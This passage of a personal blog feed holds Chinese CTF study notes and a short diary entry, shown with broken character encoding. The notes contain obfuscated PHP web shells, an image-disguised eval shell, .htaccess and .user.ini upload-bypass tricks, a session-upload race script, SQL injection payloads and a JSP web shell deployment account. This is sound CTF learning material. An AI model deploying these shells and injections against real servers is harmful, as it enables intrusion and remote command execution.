strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å…æ€é©¬"><a href="#å…æ€é©¬" class="headerlink" title="å…æ€é©¬"></a>å…æ€é©¬</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a=system&amp;b=ls</span><br></pre></td></tr></table></figure><h2 id="sessionç«äº‰ä¸Šä¼ "><a href="#sessionç«äº‰ä¸Šä¼ " class="headerlink" title="sessionç«äº‰ä¸Šä¼ "></a>sessionç«äº‰ä¸Šä¼ </h2><p>å…ˆä¸Šä¼ .user.iniåŒ…å«å¦‚ä¸‹è¯­å¥</p><pre><code>&lt;?=include&quot;/tmp/sess_haorical&quot;?&gt;</code></pre><p>è·‘è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;haorical&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;heiheihei&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="htaccessç»•è¿‡"><a href="#htaccessç»•è¿‡" class="headerlink" title=".htaccessç»•è¿‡"></a>.htaccessç»•è¿‡</h2><p>ä¸Šä¼ .htaccess</p><p>å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png   //å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">png</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;shell.png&quot; </span><br><span class="line">#æ•ˆæœå’Œ.user.iniä¸€æ ·ï¼Œç„¶åé€šè¿‡è®¿é—®åŠ è½½phpé¡µé¢å¯ä»¥è§¦å‘.htaccessçš„æŒ‡ä»¤</span><br></pre></td></tr></table></figure><h2 id="appachè§£ææ¼æ´"><a href="#appachè§£ææ¼æ´" class="headerlink" title="appachè§£ææ¼æ´"></a>appachè§£ææ¼æ´</h2><p>apacheé‡åˆ°æ— æ³•è¯†åˆ«è§£æçš„æ–‡ä»¶åç¼€æ—¶ï¼Œä¼šå‘å‰è§£æï¼Œå¦‚xxx.php.123.456,åœ¨mime.typesæ–‡ä»¶ä¸­å¦‚æœä¸å­˜åœ¨.123/.456è¿™ä¸¤ç§åç¼€ï¼Œé‚£ä¹ˆapacheä¼šå°†è¯¥æ–‡ä»¶è§£æä¸ºphpã€‚</p><p>æ¯”å¦‚1.php.jgp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;åŸºæœ¬æ€è·¯&quot;&gt;&lt;a href=&quot;#åŸºæœ¬æ€è·¯&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬æ€è·¯&quot;&gt;&lt;/a&gt;åŸºæœ¬æ€è·¯&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;ç»•è¿‡å„ç§å‰ç«¯è¿‡æ»¤&lt;/li&gt;
&lt;li&gt;ä¸Šä¼ .user.ini/.htaccess&lt;/li&gt;
&lt;li&gt;ä¸Šä¼ åŒ…å«ä¸€å¥è¯</summary>
      
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>20211031</title>
    <link href="http://haorical.xyz/posts/161306f5/"/>
    <id>http://haorical.xyz/posts/161306f5/</id>
    <published>2021-10-30T20:16:02.000Z</published>
    <updated>2021-10-30T20:24:39.546Z</updated>
    
    <content type="html"><![CDATA[<p>å¤±çœ äº†ï¼Œæƒ³äº†æƒ³ä¸çŸ¥é“å¹²ä»€ä¹ˆ</p><p>åˆšå¼€å§‹ç©äº†ä¼šå¤å¢“ä¸½å½±ï¼Œä¸æƒ³ç©äº†</p><p>æƒ³åˆ°å‰æ®µæ—¶é—´æœåŠ¡å™¨å¥½åƒåäº†ï¼Œåˆä¿®äº†ä¿®ï¼Œé‡æ–°åœ¨æœåŠ¡å™¨ä¸ŠæŠŠåšå®¢æ­å¥½äº†</p><p>ç°åœ¨åšå®¢Githubä¸Šå’ŒæœåŠ¡å™¨ä¸Šçš„éƒ½èƒ½ç”¨</p><p>ä¹‹æ‰€ä»¥ä¿ç•™Githubæ˜¯å› ä¸ºè¶³å¤Ÿç¨³å®šï¼Œç”¨çš„æ˜¯ä¸€çº§åŸŸåï¼Œ<a href="https://haorical.xyz/">https://haorical.xyz</a></p><p>æœåŠ¡å™¨ç”¨çš„é˜¿é‡Œäº‘ï¼Œå›½å†…æ¯”è¾ƒå¿«ï¼Œç”¨çš„äºŒçº§åŸŸåï¼Œ<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p><p>æš‚æ—¶æ²¡éƒ¨ç½²è¯ä¹¦ï¼Œä»¥åå†å¼„å§ï¼Œç°åœ¨ä¸æƒ³å¼„äº†ã€‚</p><p>åˆä¸çŸ¥é“å¹²å•¥äº†ï¼Œè¿‡ä¸¤å¤©ç”Ÿæ—¥ï¼Œä¸€ç‚¹æ„Ÿè§‰éƒ½æ²¡æœ‰ï¼Œæ˜å¤©è¿˜å¾—å¤ä¹ çº¿ä»£è¿˜å¾—æ‰“æ¯”èµ›ã€‚ã€‚ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤±çœ äº†ï¼Œæƒ³äº†æƒ³ä¸çŸ¥é“å¹²ä»€ä¹ˆ&lt;/p&gt;
&lt;p&gt;åˆšå¼€å§‹ç©äº†ä¼šå¤å¢“ä¸½å½±ï¼Œä¸æƒ³ç©äº†&lt;/p&gt;
&lt;p&gt;æƒ³åˆ°å‰æ®µæ—¶é—´æœåŠ¡å™¨å¥½åƒåäº†ï¼Œåˆä¿®äº†ä¿®ï¼Œé‡æ–°åœ¨æœåŠ¡å™¨ä¸ŠæŠŠåšå®¢æ­å¥½äº†&lt;/p&gt;
&lt;p&gt;ç°åœ¨åšå®¢Githubä¸Šå’ŒæœåŠ¡å™¨ä¸Šçš„éƒ½èƒ½ç”¨&lt;/p&gt;
&lt;p&gt;ä¹‹æ‰€ä»¥ä¿ç•™Githubæ˜¯å› ä¸ºè¶³å¤Ÿç¨³å®šï¼Œç”¨çš„æ˜¯ä¸€çº§åŸŸ</summary>
      
    
    
    
    <category term="éšç¬”" scheme="http://haorical.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>20211018</title>
    <link href="http://haorical.xyz/posts/5df9dcd3/"/>
    <id>http://haorical.xyz/posts/5df9dcd3/</id>
    <published>2021-10-18T13:27:21.000Z</published>
    <updated>2021-10-30T20:14:20.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-Mark-loves-cat&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Mark-loves-cat&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Mark loves cat&quot;&gt;&lt;/a&gt;[BJDCTF202</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>20211017</title>
    <link href="http://haorical.xyz/posts/cd46c142/"/>
    <id>http://haorical.xyz/posts/cd46c142/</id>
    <published>2021-10-17T13:31:05.000Z</published>
    <updated>2022-01-01T08:38:41.743Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buuè¿™ä¸ªé¢˜åº”è¯¥æ˜¯ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä¸èƒ½å¤ç°wp</p><p>å…ˆä¸Šä¼ user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ å›¾ç‰‡é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è®¿é—®è·¯å¾„ä¸‹çš„index.phpï¼Œè®©å®ƒè‡ªåŠ¨åŠ è½½é©¬</p><p>èšå‰‘æˆ–è€…ç›´æ¥cat flag</p><p>ä¸€ä¼šå„¿åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5çš„ä¸€äº›åŸºæ“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&quot;ffifdyop&quot;</span>,<span class="literal">true</span>)çš„å€¼ä¸º</span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6</span>xxxxxx</span><br><span class="line">å¯ä¸sqlç»“åˆç”¨æ¥æ„é€ æ°¸çœŸå¼</span><br><span class="line">select * <span class="keyword">from</span> <span class="number">1</span> where <span class="number">2</span>=<span class="string">&#x27;md5(&quot;ffifdyop&quot;,true)&#x27;</span></span><br><span class="line"></span><br><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span> ç»•è¿‡ == ===</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>eç»•è¿‡==</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SUCTF-2019-CheckIn&quot;&gt;&lt;a href=&quot;#SUCTF-2019-CheckIn&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]CheckIn&quot;&gt;&lt;/a&gt;[SUCTF 2019]CheckIn&lt;/h2&gt;&lt;p&gt;buuè¿™</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>20211015</title>
    <link href="http://haorical.xyz/posts/2348a06e/"/>
    <id>http://haorical.xyz/posts/2348a06e/</id>
    <published>2021-10-15T15:27:55.403Z</published>
    <updated>2021-10-15T15:32:07.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><blockquote><p>æ¨¡æ¿æ³¨å…¥</p></blockquote><p>å…ˆçœ‹æç¤ºï¼Œå‘ç°hintså’Œ/fllllllllllllagï¼Œæ ¹æ®urlçŒœæµ‹æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç ”ç©¶åé¢å‚æ•°ï¼Œçœ‹hintsï¼Œå‘ç°renderï¼Œç ”ç©¶ç ”ç©¶å•¥ç©æ„</p><p>renderæ˜¯ä¸€ä¸ªç±»ä¼¼æ¨¡æ¿çš„ä¸œè¥¿ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°æ¥è®¿é—®ç½‘é¡µ</p><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œä¾‹å¦‚ <code>&#123;&#123;handler.settings&#125;&#125;</code></p><p>è¿™ä¸¤ä¸ª<code>&#123;&#123;&#125;&#125;</code>å’Œè¿™ä¸ªå­—å…¸å¯¹è±¡ä¹Ÿè®¸å¤§å®¶å°±çœ‹å‡ºæ¥äº†ï¼Œæ²¡é”™å°±æ˜¯è¿™ä¸ªhandler.settingså¯¹è±¡<br>handler æŒ‡å‘RequestHandler</p><p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p><p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settings</p><p>å¯ä»¥è·å¾—ä¸€äº›è®¾ç½®</p><p>ç„¶åæˆåŠŸè·å¾—cookie_secretï¼Œmd5è·å¾—hashå€¼å³å¯</p><p>åœ¨msgé¡µé¢å¯ä»¥å®ç°æ¨¡æ¿æ³¨å…¥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æŠ¤ç½‘æ¯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#æŠ¤ç½‘æ¯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[æŠ¤ç½‘æ¯ 2018]easy_tornado&quot;&gt;&lt;/a&gt;[æŠ¤ç½‘æ¯ 2018]easy_tornado</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>å›½åº†èµ›éƒ¨åˆ†èµ›é¢˜å¤ç°</title>
    <link href="http://haorical.xyz/posts/bfdb9200/"/>
    <id>http://haorical.xyz/posts/bfdb9200/</id>
    <published>2021-10-13T11:05:32.000Z</published>
    <updated>2021-10-13T13:59:32.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote><p>ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå¤ç°ä¸€åŠå‡ºä¸æ¥äº†</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥åº“å</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">æŸ¥è¡¨å</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ— åˆ—åæ³¨å…¥</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>æŒ‰ç…§wpçš„åå¼¹shellæ²¡æ‰“é€š</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>è¿™ä¸ªé¢˜å­¦åˆ°çš„æŒºå¤šçš„</p><p>å…ˆé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è·å¾—å¯†é’¥å’Œå¯†æ–‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨è¿™ä¸ª<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>æ–‡ç« ä¸­æåˆ°çš„ï¼Œè·å¾—å¯†ç ï¼Œç™»å…¥åå°ï¼Œéƒ¨ç½²æœ¨é©¬ã€‚</p><p>waræœ¨é©¬ï¼Œå°±æ˜¯å°†jspæœ¨é©¬å‹ç¼©æˆzipï¼Œç„¶åæ”¹åç¼€å°±è¡Œï¼Œè¿™é‡ŒæŠŠwaréƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><p>è®¿é—®å¤§é©¬æ–‡ä»¶<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p><p>æ‰¾åˆ°ä¸ªflag.tarï¼Œç»“æœæˆ‘è§£å‹çš„æ—¶å€™ç»™ç ´åäº†ï¼Œç°åœ¨æœåŠ¡å™¨é‡Œæ²¡flagäº†ï¼Œå®ƒè¿™ä¸ªæ˜¯æ‰€æœ‰äººä¸€ä¸ªç¯å¢ƒï¼Œåé¢å¤ç°çš„äººå¾—å¤šå°‘æœ‰ç‚¹æ‡µé€¼ï¼Œæ‰€ä»¥ï¼š</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p><p>æˆ‘åœ¨æ ¹ç›®å½•é‡Œé¢åˆ›å»ºäº†ä¸ªå‡çš„flagï¼ˆå“ˆå“ˆå“ˆï¼Œé€ƒ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;sql2&quot;&gt;&lt;a href=&quot;#sql2&quot; class=&quot;headerlink&quot; title=&quot;sql2&quot;&gt;&lt;/a&gt;sql</summary>
      
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="sqlæ³¨å…¥" scheme="http://haorical.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2021ç§‹å­£èµ›éƒ¨åˆ†wp</title>
    <link href="http://haorical.xyz/posts/31200392/"/>
    <id>http://haorical.xyz/posts/31200392/</id>
    <published>2021-10-11T15:41:41.000Z</published>
    <updated>2021-10-11T15:56:40.461Z</updated>
    
